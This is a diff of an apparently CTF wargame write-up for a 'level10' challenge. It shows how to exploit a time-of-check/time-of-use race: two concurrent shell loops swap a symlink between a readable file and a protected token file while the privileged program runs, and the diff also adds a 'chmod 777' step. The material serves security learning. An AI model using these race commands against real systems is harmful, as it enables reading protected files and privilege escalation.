@@ -84,8 +84,9 @@ access(link_file) // return 0 so we can access it
 link_file linked to token // which is not accessible
 open(link_file) // return the content of token file
 
-so let's create an accessible file
-touch /tmp/random_file
+so let's create an accessible file in our home
+chmod 777 .
+touch random_file
 
 we need to bruteforce this and wait for the perfect timing so we will use 2 while in shell with a & like that
 the 2 while will run together
@@ -93,7 +94,7 @@ first while will need to always change the link (ln -fs f for overrind the dest 
 second while will need to launch the program
 so:
 
-while 1 (ln -fs /tmp/random_file /tmp/token; ln -fs token /tmp/token; done)& while 1 (./level10 /tmp/token ip; done)
+(while true; do ln -fs random_file flag; ln -fs token flag; done)& while true; do ./level10 flag ip; done
 
 after a lot of error we receive the content !
 
